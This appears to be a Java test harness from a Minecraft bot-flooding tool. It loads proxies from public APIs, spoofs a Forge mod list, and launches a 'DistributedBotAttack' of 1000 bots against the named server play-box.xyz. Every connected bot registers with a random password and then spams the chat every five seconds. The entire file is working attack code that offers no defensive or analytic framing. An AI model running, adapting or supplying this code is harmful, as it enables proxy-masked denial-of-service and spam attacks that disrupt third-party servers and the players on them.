import java.util.HashMap;

import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;

import net.emtips.endminecraftplusplus.proxy.ProxyPool;
import net.emtips.endminecraftplusplus.ATTACK.DistributedBotAttack;
import net.emtips.endminecraftplusplus.utils.mainUtils;


public class Test {
    public static void main(String[] args) {
        ProxyPool.getProxysFromAPIs();

        HashMap<String, String> modList =new HashMap<String,String>();
        modList.put("BuildCraft|Core","7.1.14");
        modList.put("Baubles","1.0.1.10");
        modList.put("flammpfeil.nihil","mc1.7.x-r8");
        modList.put("armourersWorkshop","1.7.10-0.47.1");
        modList.put("harvestcraft","1.7.10g");
        modList.put("plushieWrapper","0.0.0");
        modList.put("BuildCraft|Builders","7.1.14");
        modList.put("ThaumicTinkerer","unspecified");
        modList.put("BuildCraft|Transport","7.1.14");
        modList.put("mobends","0.20");
        modList.put("flammpfeil.slashblade.anvilenchant","mc1.7.10-r1");
        modList.put("NodalMechanics","1.7.10R1.0");
        modList.put("flammpfeil.fluorescentbar","mc1.7.2-r3");
        modList.put("flammpfeil.slashblade.kirisaya","r1");
        modList.put("flammpfeil.toyako","mc1.7.2-r1");
        modList.put("BambooMod","Minecraft@MC_VERSION@ var@VERSION@");
        modList.put("flammpfeil.slashblade.kamuy","mc1.7.10-r6");
        modList.put("recipehandler","1.7.10");
        modList.put("BuildCraft|Robotics","7.1.14");
        modList.put("BuildCraft|Energy","7.1.14");
        modList.put("BuildCraft|Factory","7.1.14");
        modList.put("GraviSuite","1.7.10-2.0.3");
        modList.put("Avaritia","1.1");
        modList.put("ArchitectureCraft","1.4.0");
        modList.put("flammpfeil.frostwolf","mc1.7.2-r1");
        modList.put("AdvancedSolarPanel","1.7.10-3.5.1");
        modList.put("bspkrsCore","6.15");
        modList.put("slashblade.yukari","mc1.7.10-r1");
        modList.put("BuildCraft|Silicon","7.1.14");
        modList.put("craftguide","1.6.8.2");
        modList.put("flammpfeil.slashblade.laemmle","mc1.7.10-r1");
        modList.put("flammpfeil.slashblade","mc1.7.10-r87");
        modList.put("FoodCraft","1.2.0");
        modList.put("TaintedMagic","r7.6");
        modList.put("flammpfeil.slashblade.terra","mc1.7.10-r1");
        modList.put("balumg","1.0.0");
        modList.put("Botania","r1.8-249");
        modList.put("flammpfeil.slashblade.blademaster","mc1.7.2-r1");
        modList.put("customnpcs","1.7.10d");
        modList.put("flammpfeil.slashblade.zephyr","1.7.2 r1.2");
        modList.put("ForbiddenMagic","1.7.10-0.575");
        modList.put("Thaumcraft","4.2.3.5");
        modList.put("IronChest","6.0.62.742");
        modList.put("AgriCraft","1.7.10-1.5.0");
        modList.put("ExtraBotany","r1.0-21");
        modList.put("IC2","2.2.804-experimental");

        DistributedBotAttack attack = new DistributedBotAttack(3600,1000,0,false,false,modList);
        attack.setTask(()->{
            while(true) {
                synchronized (attack.clients) {
                    attack.clients.forEach(c->{
                        if(c.getSession().isConnected()) {
                            Object isjoin=c.getSession().getFlag("join");
                            if(isjoin==null||((boolean)isjoin)==false) return;
                            Object islogin=c.getSession().getFlag("login");
                            if(islogin!=null&&((boolean)islogin)==true) {
                                c.getSession().send(new ClientChatPacket(mainUtils.getRandomString(1,4)+"喵喵喵喵喵~"));
                            }else{
                                String pwd=mainUtils.getRandomString(7,12);
                                c.getSession().send(new ClientChatPacket("/register "+pwd+" "+pwd));
                                c.getSession().setFlag("login",true);
                            }

                        }
                    });
                }
                mainUtils.sleep(5*1000);
            }
        });
        attack.start("play-box.xyz", 25565);
    }
}
